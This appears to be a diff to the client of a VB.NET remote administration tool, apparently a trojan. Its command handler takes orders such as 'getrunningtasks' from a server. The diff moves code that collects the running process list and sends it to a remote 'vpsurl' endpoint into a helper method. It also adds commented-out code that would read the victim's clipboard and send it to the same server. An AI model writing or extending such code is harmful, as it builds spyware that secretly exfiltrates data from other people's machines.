@@ -4,6 +4,7 @@ Imports System.Threading
 Imports System.Net.NetworkInformation
 Imports System.IO
 Imports System.Management
+Imports Microsoft.VisualBasic.MyServices
 
 ''' <summary>
 ''' TODO: Add mutex
@@ -168,14 +169,24 @@ Public Class MainForm
 
         ElseIf actionType = "getrunningtasks" Then
             ' TODO : check this feature
-            Dim total As String = ""
-            For Each p As Process In Process.GetProcesses
-                total += p.Id & "|"
-                total += p.ProcessName & "|"
-                total += p.MainWindowTitle & "|"
-                total += (p.WorkingSet64 / 1024) / 1024 & "[;;]"
-            Next
-            mainWebClient.DownloadString(My.Settings.vpsurl & "clients.php?action=sendtasks&actioncontent=" & total)
+            IndependantActions.UploadRunningTasks(mainWebClient)
+
+        ElseIf actionType = "getclipboard" Then
+            ' TODO : make getclipboard
+
+            ' Dim clipboardContent As String = "[Nothing]"
+
+            'If Clipboard.ContainsImage Or Clipboard.ContainsFileDropList Or Clipboard.ContainsAudio Then
+            '   clipboardContent = "[Clipboard contains one or multiple images, files or audios]"
+            'ElseIf Clipboard.ContainsText(textdataformat.text) Then
+            '   clipboardContent = Clipboard.GetText()
+            'End If
+
+
+            ' MsgBox("sent " & Clipboard.GetText(TextDataFormat.UnicodeText))
+            ' ok
+            ' sois attentif regazrde
+            '  mainWebClient.DownloadString(My.Settings.vpsurl & "clients.php?action=sendclipboard&actioncontent=" & clipboardContent)
         End If
 
 #End Region
